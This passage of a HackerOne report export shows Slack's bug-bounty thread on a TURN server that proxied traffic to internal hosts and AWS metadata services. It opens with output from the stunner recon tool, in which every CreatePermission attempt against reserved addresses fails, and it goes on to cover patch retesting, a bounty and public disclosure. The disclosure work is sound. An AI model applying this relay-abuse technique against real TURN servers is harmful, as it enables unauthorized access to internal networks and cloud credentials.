192.88.99.1:80 failed\nstunner/createpermission> udp recon CreatePermission 192.168.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 192.168.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 198.18.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 198.18.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 198.51.100.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 198.51.100.1:80 failed\nstunner/createpermission> udp recon CreatePermission 203.0.113.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 203.0.113.1:80 failed\nstunner/createpermission> udp recon CreatePermission 224.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 224.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 240.0.0.1:80 failed\nstunner/createpermission> tcp recon CreatePermission 240.0.0.1:80 failed\nstunner/createpermission> udp recon CreatePermission 255.255.255.255:80 failed\nstunner/createpermission> tcp recon CreatePermission 255.255.255.255:80 failed\n```",
      "automated_response": false,
      "created_at": "2018-04-20T02:55:22.244Z",
      "updated_at": "2018-04-20T02:55:22.244Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2644794,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci Awesome! Thanks for confirming the patch works. We will continue working on this. I will keep you updated when we have additional information.",
      "automated_response": false,
      "created_at": "2018-04-20T03:34:09.228Z",
      "updated_at": "2018-04-20T03:34:09.228Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2645027,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Excellent - yes do keep me up to date",
      "automated_response": false,
      "created_at": "2018-04-20T06:40:34.270Z",
      "updated_at": "2018-04-20T06:40:34.270Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2681327,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @fyunaz - following up on the status of this one. Do you require anything else from our side?",
      "automated_response": false,
      "created_at": "2018-04-30T18:36:00.504Z",
      "updated_at": "2018-04-30T18:36:00.504Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2682912,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @sandrogauci, \nNo, there's nothing that we need from your end at this point. Our team is still working on the additional fix. We will let you know when we have additional information.\n\nThanks!",
      "automated_response": false,
      "created_at": "2018-04-30T22:58:42.416Z",
      "updated_at": "2018-04-30T22:58:42.416Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2731156,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @sandrogauci, \n\nThanks for your patience. We have pushed the patch to all of our production severs. We added more strict rules and also verified that all of our Calls functionality works with the current settings. It might seems like we are blocking legitimate traffic but it's not. We are only allowing necessary traffic. Can you please re-test all of your test cases one more time to our prod server especially the UDP over TURN to access the DNS server?\n\nThanks!",
      "automated_response": false,
      "created_at": "2018-05-11T20:03:57.627Z",
      "updated_at": "2018-05-11T20:03:57.627Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2737475,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Will test as soon as we can and get back to you.",
      "automated_response": false,
      "created_at": "2018-05-14T07:38:23.808Z",
      "updated_at": "2018-05-14T07:38:23.808Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2752205,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci, kindly following up on the status. Did you confirm the fix? I think we can close this issue but would be great if can get your testing done before closing this.",
      "automated_response": false,
      "created_at": "2018-05-16T16:53:44.497Z",
      "updated_at": "2018-05-16T16:53:44.497Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2752346,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@fyunaz thanks for the follow up. I've been at a conference these last days and swamped with work. I think however I'll have time to verify the fixes sometime tomorrow. Do we test on live?",
      "automated_response": false,
      "created_at": "2018-05-16T17:31:17.930Z",
      "updated_at": "2018-05-16T17:31:17.930Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2752392,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@sandrogauci Tomorrow sounds good. And yes, please do the testing on prod (live) system. Let me know if you need more information.\n\nThanks!",
      "automated_response": false,
      "created_at": "2018-05-16T17:44:50.793Z",
      "updated_at": "2018-05-16T17:44:50.793Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2766746,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @fyunaz - we have tested the fix and realised that the fix blocks everything but UDP packets towards the WebRTC gateway. We didn't find ways to exploit this configuration to get any responses and are happy to close this issue. Thanks for awaiting our confirmation. Hope that our feedback and various retests were valuable to you and your colleagues.",
      "automated_response": false,
      "created_at": "2018-05-19T19:47:54.629Z",
      "updated_at": "2018-05-19T19:47:54.629Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2772489,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Just in case it was not clear from my response; I confirm that the fix appears to do the job.\n",
      "automated_response": false,
      "created_at": "2018-05-21T07:12:33.392Z",
      "updated_at": "2018-05-21T07:12:33.392Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2774382,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Thank you for the confirmation and for your patience! We will resolve and reward shortly!",
      "automated_response": false,
      "created_at": "2018-05-21T16:18:58.799Z",
      "updated_at": "2018-05-21T16:18:58.799Z",
      "actor": {
        "username": "fyunaz",
        "cleared": false,
        "verified": false,
        "url": "/fyunaz",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "sandrogauci",
        "url": "/sandrogauci"
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 2776094,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "Thank you for your report!\n\nThe Slack Security Team",
      "automated_response": false,
      "created_at": "2018-05-21T21:52:18.305Z",
      "updated_at": "2018-05-21T21:52:18.305Z",
      "actor": {
        "url": "/slack",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Slack"
        }
      },
      "bounty_amount": "3500.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "slack",
      "collaborator": {
        "username": "sandrogauci",
        "url": "/sandrogauci"
      }
    },
    {
      "id": 6825060,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @fyunaz  can you make this report public please?",
      "automated_response": false,
      "created_at": "2020-01-21T11:20:17.281Z",
      "updated_at": "2020-01-21T11:20:17.281Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 6925924,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-01-31T04:00:45.359Z",
      "updated_at": "2020-01-31T04:00:45.359Z",
      "first_to_agree": true,
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 7149925,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @sandrogauci,\n\nWe're going to temporarily cancel your disclosure request, as we are performing a review of high severity and above disclosures, and want give your report appropriate consideration before it becomes public. As soon as we complete our review, we will contact you about disclosure.\n\nWe apologize for the delay.",
      "automated_response": false,
      "created_at": "2020-02-25T20:09:12.886Z",
      "updated_at": "2020-02-25T20:09:12.886Z",
      "actor": {
        "username": "bugtriage-josh",
        "cleared": false,
        "verified": false,
        "url": "/bugtriage-josh",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 7149927,
      "is_internal": false,
      "editable": false,
      "type": "Activities::CancelledDisclosureRequest",
      "message": "As noted above",
      "automated_response": false,
      "created_at": "2020-02-25T20:09:30.143Z",
      "updated_at": "2020-02-25T20:09:30.143Z",
      "actor": {
        "username": "bugtriage-josh",
        "cleared": false,
        "verified": false,
        "url": "/bugtriage-josh",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 7171433,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bugtriage-josh - that comes unexpectedly as we were under the impression that you successfully resolved this issue 2 years ago. We have an educational presentation to give at Kamailio World and were hoping to use this report as an example of our contribution to the WebRTC security space. We're not interested in making Slack look bad of course; only to have practical and real examples to the VoIP/WebRTC developers in the audience.\n\nCould you let me know when your review is planned to be complete so that we can prepare accordingly?",
      "automated_response": false,
      "created_at": "2020-02-28T02:45:46.899Z",
      "updated_at": "2020-02-28T02:45:46.899Z",
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 7226254,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-03-04T15:29:16.828Z",
      "updated_at": "2020-03-04T15:29:16.828Z",
      "first_to_agree": true,
      "actor": {
        "username": "sandrogauci",
        "cleared": false,
        "verified": false,
        "url": "/sandrogauci",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 7294432,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "Hey @sandrogauci \n\nWe should be good to go with disclosure now.  Sorry about the delay and thank you for your patience. ",
      "automated_response": false,
      "created_at": "2020-03-12T00:15:42.542Z",
      "updated_at": "2020-03-12T00:15:42.542Z",
      "actor": {
        "username": "bugtriage-josh",
        "cleared": false,
        "verified": false,
        "url": "/bugtriage-josh",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    },
    {
      "id": 7294434,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2020-03-12T00:15:42.719Z",
      "updated_at": "2020-03-12T00:15:42.719Z",
      "actor": {
        "username": "bugtriage-josh",
        "cleared": false,
        "verified": false,
        "url": "/bugtriage-josh",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "slack"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 20683,
      "category": "researcher",
      "content": "TURN server allowed proxying of TCP connections and UDP packets to internal Slack network and meta-data services on AWS.",
      "user": {
        "id": 58642,
        "username": "sandrogauci",
        "name": "Sandro Gauci",
        "bio": "CEO at Enable Security",
        "cleared": false,
        "verified": false,
        "website": "https://www.enablesecurity.com",
        "location": "",
        "created_at": "2016-03-01T07:39:14.591Z",
        "url": "https://hackerone.com/sandrogauci",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": [

      ]
    }
  ]
}